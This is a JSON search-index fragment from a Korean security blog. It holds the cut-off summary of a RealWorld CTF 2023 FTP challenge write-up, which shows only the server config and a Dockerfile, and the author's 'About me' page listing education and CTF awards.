","permalink":"https://msh1307.kr/blog/realworld_ctf_2023_noneheavyftp/","summary":"NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.\nAnalysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.\nFROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update \u0026amp;\u0026amp;\\ apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid RUN mkdir -p /server/data/ \u0026amp;\u0026amp;\\ echo \u0026#34;hello from LightFTP\u0026#34; \u0026gt;\u0026gt; /server/data/hello.txt \u0026amp;\u0026amp;\\ cd /server \u0026amp;\u0026amp;\\ wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip \u0026amp;\u0026amp;\\ unzip LightFTP-2.2.zip \u0026amp;\u0026amp;\\ cd LightFTP-2.2/Source/Release \u0026amp;\u0026amp;\\ make \u0026amp;\u0026amp;\\ cp -a .","title":"RealWorld CTF 2023 - NoneHeavyFTP"},{"content":"Profile 맹서현 / 2006.02.17\nEducation 선린인터넷고등학교 SW 영재원 (2020.04 ~ 2020.11) 선린인터넷고등학교 SW 영재원 (2021.04 ~ 2021.11) 현대오토에버 화이트해커 양성교육 (2022.07 ~ 2022.11) KITRI BoB 12th Vulnerability Analysis (2023.07 ~ ) Awards 2nd, 선린 고등해커 페스티벌 2023 (Team 냥코) 2nd, Dreamhack KAPO, KAIST-POSTECH CTF 2023 1st, ABB CTF 2023 (₩1,000,000) (Team 냥코대전쟁) 1st, Cyber Guardians CTF 2023 (Team 냥코대전쟁) 2nd, WITHCON, Whitehat Contest Junior 2023 (₩4,000,000) (Team 뿡빵띠) 3rd, WACON, Whitehat Attack Contest Junior 2023 (₩2,000,000) (Team 옆집 서현이 때문에 어느샌가 블랙해커로 타락한 사연) 4th, YISF CTF 2023 (₩500,000) 3rd, KOSPO CTF 2023 (₩500,000) (Team cats save the world) 3rd, CCE, Cyber Conflict Exercise Junior 2023 (₩1,000,000) (Team 가끔씩 툭하고 어셈블리어로 부끄러워하는 옆자리의 서현 군) 2nd, JBU CTF 2023 (₩100,000) (Team 달) Finalist, Codegate Junior 2023 1st, 선린 모의해킹방어대회 2023 2nd, 선린 고등해커 페스티벌 2022 (Team Sechack) 2nd, 현대오토에버 화이트해커 경진대회 2022 (₩1,000,000) 2nd, Cyber Guardians CTF 2022 3rd, LOGCON CTF 2022 4th, Dreamhack Christmas CTF 2022 Finalist, Whitehat Contest Junior 2022 Finalist, CCE, Cyber Conflict Exercise Junior 2022 한림장학재단 장학생 선발 (₩1,000,000) 창의적 산출물 발표회 금상 2021 SW 영재 창작대회 장려상 2021 창의적 산출물 발표회 우수상 2020 ","permalink":"https://msh1307.kr/about/","summary":"About me","title":"About me"}]